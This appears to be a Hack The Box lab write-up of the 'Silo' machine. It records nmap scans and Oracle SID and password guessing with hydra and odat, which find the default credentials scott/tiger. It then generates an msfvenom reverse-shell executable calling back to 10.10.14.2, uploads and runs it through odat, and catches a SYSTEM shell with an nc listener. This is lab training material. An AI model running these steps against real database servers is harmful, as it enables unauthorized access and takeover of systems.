<img src="Pasted image 20240722183752.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
```
ping 10.10.10.82
```
![[Pasted image 20240619150849.png]]

Nmap Default Scan
```
nmap 10.10.10.82 -oN dnmap
```
![[Pasted image 20240619151001.png]]

Nmap Script And Service Scan
```
nmap 10.10.10.82 -sV -sC -A -oN snmap
```
![[Pasted image 20240619151702.png]]
![[Pasted image 20240619151716.png]]

Nmap All Port Scan
```
nmap 10.10.10.82 -p- -sC -sV --open -T5 -oN anmap
```
![[Pasted image 20240619151732.png]]
![[Pasted image 20240619151746.png]]

**Oracle Enumeration on port 1521**
First will try to Check is it open to Listen
```
tnscmd10g status -h 10.10.10.82
```
![[Pasted image 20240619160756.png]]
No luck, will use hydra to get SID or Creds
```
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid -t 64 -I
```
![[Pasted image 20240619160901.png]]

Have also used odat to get Valid Sid
```
odat sidguesser -s 10.10.10.82 -p1521
```
![[Pasted image 20240619160713.png]]
Found valid SID, it is XE, using this will get creds

```
odat passwordguesser  -s 10.10.10.82 -p1521 -d XE
```
or 
```
odat all -s 10.10.10.82 -p 1521 -d XE -v
```
it will take time wait to for the complete enumeration
![[Pasted image 20240619161137.png]]
Got it....!


We now have valid credentials: username **scott** and password **tiger** for the server identified as **XE**. We can use these credentials to upload and execute a reverse shell.

Will generate a binary using MSVENOM
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe > shell.exe
```
![[Pasted image 20240619161718.png]]

Upload it into the server
```
odat utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile /temp pwn.exe /root/HTB/linux/silo/shell.exe
```
![[Pasted image 20240619161757.png]]

Trigger it catch Reverse Shell, al Set up listener
```
rlwrap nc -nvlp 443
```
```
odat externaltable -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --exec /temp pwn.exe
```
![[Pasted image 20240619161901.png]]
Got it...!
![[Pasted image 20240619161916.png]]
We Are nt/authority, so no need to do Privilege Escalation.....!

User.txt
![[Pasted image 20240619162430.png]]

**Root.txt**
![[Pasted image 20240619162504.png]]


Done with Silo.....:)



